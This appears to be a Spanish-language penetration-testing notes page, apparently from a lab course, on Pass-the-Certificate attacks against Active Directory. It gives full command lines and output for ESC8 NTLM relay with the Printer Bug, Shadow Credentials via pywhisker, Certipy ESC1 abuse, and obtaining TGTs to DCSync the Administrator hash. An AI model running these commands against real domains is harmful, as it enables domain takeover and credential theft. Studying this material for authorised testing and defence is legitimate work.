# Pass-the-Certificate

## Pass-the-Certificate

Pass-the-Certificate es una técnica que usa certificados X.509 para obtener TGTs de Kerberos mediante **PKINIT** (Public Key Cryptography for Initial Authentication), una extensión del protocolo Kerberos que permite autenticación con clave pública en lugar de contraseña. Se usa principalmente junto a ataques contra AD CS (Active Directory Certificate Services) y ataques de Shadow Credentials.

Una vez obtenido un TGT, el flujo es idéntico al Pass-the-Ticket — se exporta en `KRB5CCNAME` y se usa con Impacket, Evil-WinRM o cualquier herramienta que soporte Kerberos.

### Vector 1 — ESC8: NTLM Relay a AD CS Web Enrollment

ESC8 explota la inscripción web de AD CS (disponible en `/CertSrv` via HTTP). Si la CA permite inscripción web sin firma HTTPS, se puede hacer relay de una autenticación NTLM capturada y obtener un certificado en nombre de la cuenta víctima — incluyendo cuentas de máquina de DCs.

#### Flujo del ataque

```
DC01$ → intenta autenticar → atacante (ntlmrelayx) → relay → CA Web Enrollment
                                                                    ↓
                                                         certificado DC01$.pfx
                                                                    ↓
                                              gettgtpkinit → TGT como DC01$
                                                                    ↓
                                                    DCSync → hash Administrator
```

#### Paso 1 — Listener con ntlmrelayx apuntando a la CA

```bash
impacket-ntlmrelayx \
  -t http://10.129.234.110/certsrv/certfnsh.asp \
  --adcs \
  -smb2support \
  --template KerberosAuthentication
```

> La plantilla `KerberosAuthentication` es la que usan los DCs. En otros entornos puede variar — enumerar con Certipy primero.

#### Paso 2 — Forzar autenticación del DC (Printer Bug)

El Printer Bug fuerza a una cuenta de máquina a autenticarse contra un host arbitrario si tiene el servicio Spooler activo:

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/usuario:"contraseña"@10.129.234.109 10.10.16.12
# 10.129.234.109 = DC01 (objetivo)
# 10.10.16.12    = host atacante (donde escucha ntlmrelayx)
```

ntlmrelayx captura la autenticación de `DC01$`, la retransmite a la CA y obtiene el certificado:

```
[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
```

#### Paso 3 — Obtener TGT con el certificado (PKINITtools)

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate
pip3 install -r requirements.txt

# Si da error "Error detecting the version of libcrypto":
pip3 install -I git+https://github.com/wbond/oscrypto.git

# Solicitar TGT usando el certificado PFX
python3 gettgtpkinit.py \
  -cert-pfx ../DC01\$.pfx \
  -dc-ip 10.129.234.109 \
  'inlanefreight.local/dc01$' \
  /tmp/dc.ccache
```

Salida:

```
INFO:minikerberos:AS-REP encryption key: 3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e...
INFO:minikerberos:Saved TGT to file
```

#### Paso 4 — DCSync como DC01$

Con el TGT de la cuenta de máquina del DC se puede hacer DCSync:

```bash
export KRB5CCNAME=/tmp/dc.ccache

impacket-secretsdump \
  -k -no-pass \
  -dc-ip 10.129.234.109 \
  -just-dc-user Administrator \
  'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

### Vector 2 — Shadow Credentials (msDS-KeyCredentialLink)

Shadow Credentials abusa del atributo `msDS-KeyCredentialLink` de un objeto AD, que almacena claves públicas para autenticación PKINIT. Si se tiene permiso de escritura sobre ese atributo en otro usuario (edge `AddKeyCredentialLink` en BloodHound), se puede añadir una clave controlada y autenticarse como esa cuenta sin conocer su contraseña.

#### Paso 1 — Añadir Shadow Credential con pywhisker

```bash
pip install pywhisker

pywhisker \
  --dc-ip 10.129.234.109 \
  -d INLANEFREIGHT.LOCAL \
  -u wwhite \
  -p 'Password123' \
  --target jpinkman \
  --action add
```

Salida:

```
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
```

Pywhisker genera un certificado X.509, escribe la clave pública en el atributo del objetivo y exporta el `.pfx` con la clave privada.

#### Paso 2 — Obtener TGT como la víctima

```bash
python3 gettgtpkinit.py \
  -cert-pfx ../eFUVVTPf.pfx \
  -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
  -dc-ip 10.129.234.109 \
  INLANEFREIGHT.LOCAL/jpinkman \
  /tmp/jpinkman.ccache
```

#### Paso 3 — Usar el TGT

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist

# Si jpinkman tiene WinRM
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

# Verificar acceso a recursos
proxychains impacket-wmiexec dc01 -k -no-pass
```

#### Listar y limpiar Shadow Credentials

```bash
# Ver todas las claves del target
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL \
  -u wwhite -p 'Password123' --target jpinkman --action list

# Eliminar una clave específica por DeviceID
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL \
  -u wwhite -p 'Password123' --target jpinkman \
  --action remove --device-id 3496da7f-ab0d-13e0-1273-5abca66f901d
```

> Limpiar las Shadow Credentials añadidas al terminar el engagement — dejar claves huérfanas en `msDS-KeyCredentialLink` puede romper la autenticación legítima de la cuenta si PKINIT está activo.

### Alternativa — Certipy (todo en uno)

Certipy combina la enumeración de AD CS, la explotación de ESC y Pass-the-Certificate en una sola herramienta:

```bash
pip install certipy-ad

# Enumerar plantillas vulnerables
certipy find -u usuario@INLANEFREIGHT.LOCAL -p contraseña -dc-ip 10.129.234.109 -vulnerable

# ESC1 — solicitar certificado con SAN arbitrario
certipy req \
  -u usuario@INLANEFREIGHT.LOCAL -p contraseña \
  -dc-ip 10.129.234.109 \
  -ca CA-INLANEFREIGHT \
  -template VulnerableTemplate \
  -upn Administrator@INLANEFREIGHT.LOCAL

# Autenticar con el certificado y obtener TGT + hash NT
certipy auth \
  -pfx administrator.pfx \
  -dc-ip 10.129.234.109
```

Certipy auth devuelve directamente el TGT en `.ccache` y el hash NT de la cuenta, lo que permite tanto PtT como PtH.

### Cuando PKINIT no está disponible

En entornos donde el KDC no soporta la EKU necesaria para PKINIT (raro pero posible), la herramienta `PassTheCert` permite autenticarse contra **LDAPS** con el certificado y realizar operaciones como cambiar contraseñas o conceder derechos de DCSync sin necesitar PKINIT.

### Resumen

| Prerrequisito                                    | Técnica              | Herramienta                 | Resultado                                 |
| ------------------------------------------------ | -------------------- | --------------------------- | ----------------------------------------- |
| Permiso de escritura en `msDS-KeyCredentialLink` | Shadow Credentials   | pywhisker + PKINITtools     | TGT como el usuario objetivo              |
| AD CS con Web Enrollment sin HTTPS               | ESC8 NTLM Relay      | ntlmrelayx + printerbug     | Certificado de cuenta de máquina → DCSync |
| Plantilla ESC1 (SAN arbitrario)                  | ADCS Abuse           | Certipy                     | TGT + NT hash de cualquier usuario        |
| Certificado obtenido por cualquier vía           | Pass-the-Certificate | gettgtpkinit / Certipy auth | TGT → PtT con Impacket/Evil-WinRM         |
